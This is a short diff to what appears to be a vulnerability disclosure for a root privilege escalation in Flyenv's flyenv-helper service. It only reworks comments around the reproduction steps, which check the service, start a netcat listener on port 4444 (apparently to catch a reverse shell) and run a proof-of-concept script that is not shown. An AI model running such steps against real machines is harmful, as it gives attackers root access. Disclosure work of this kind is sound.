@@ -12,12 +12,11 @@ Any local, unprivileged user can execute arbitrary commands as **root**.
 Execute Flyenv and make sure that flyenv-helper is installed and running: 
 
 ```bash
+# Terminal 1
 systemctl status flyenv-helper
-
-# Terminal 1 — listener
 nc -lvnp 4444
 
-# Terminal 2 — run the PoC
+# Terminal 2 - run the PoC
 python3 flyenv_lpe_poc.py
 ```
 
